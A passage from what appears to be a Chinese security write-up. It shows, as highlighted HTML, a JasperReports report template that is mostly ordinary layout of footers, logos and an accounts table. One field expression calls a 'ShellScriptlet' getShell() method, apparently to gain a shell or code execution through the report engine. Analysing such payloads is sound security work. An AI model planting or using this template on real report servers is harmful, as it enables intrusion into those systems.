class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"265"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"4b5dd0d1-9011-42cf-ab07-f80c02d3d166"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:AllAccounts_Res2"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["Jaspersoft Logo"]]&gt;<span class="tag">&lt;/<span class="name">hyperlinkTooltipExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">componentElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">key</span>=<span class="string">"table"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"db3dd84a-3743-43b3-ab7e-c4aebdb907df"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:table</span> <span class="attr">xmlns:jr</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports/components http://jasperreports.sourceforge.net/xsd/components.xsd"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">datasetRun</span> <span class="attr">subDataset</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"3b2a079f-f600-46a6-a7af-720c4e939e7e"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">connectionExpression</span>&gt;</span>&lt;![CDATA[$P&#123;REPORT_CONNECTION&#125;]]&gt;<span class="tag">&lt;/<span class="name">connectionExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">datasetRun</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnGroup</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">uuid</span>=<span class="string">"1e5d630a-c8f9-4dbb-8415-393f7624ca35"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:groupHeader</span> <span class="attr">groupName</span>=<span class="string">"CityGroup"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:cell</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">backcolor</span>=<span class="string">"#C0C0C0"</span> <span class="attr">uuid</span>=<span class="string">"aeafecc2-ef7e-435c-ae07-1f45ed6b179a"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;CityyNumber&#125;.intValue() + 1) + ". " + $F&#123;billing_address_city&#125;+ ", " + $F&#123;billing_address_country&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">anchorNameExpression</span>&gt;</span>&lt;![CDATA[String.valueOf($F&#123;billing_address_city&#125;)]]&gt;<span class="tag">&lt;/<span class="name">anchorNameExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:cell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:groupHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"43ffff20-e89f-4f73-ad8d-878e9581274a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"a76dcb9c-8601-48bc-b9cc-3d1c316e537d"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" "]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"73a40f28-2c08-4849-a2a9-b83ade7a6b7d"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"10"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">uuid</span>=<span class="string">"d472eeed-282a-402b-9044-a397ca270655"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"bd0d4582-5684-4e15-8623-b3f1940bf1bb"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.colspan"</span> <span class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></span><br><span class="line"></span><br><span class="line">接下来看42行：</span><br><span class="line"><span 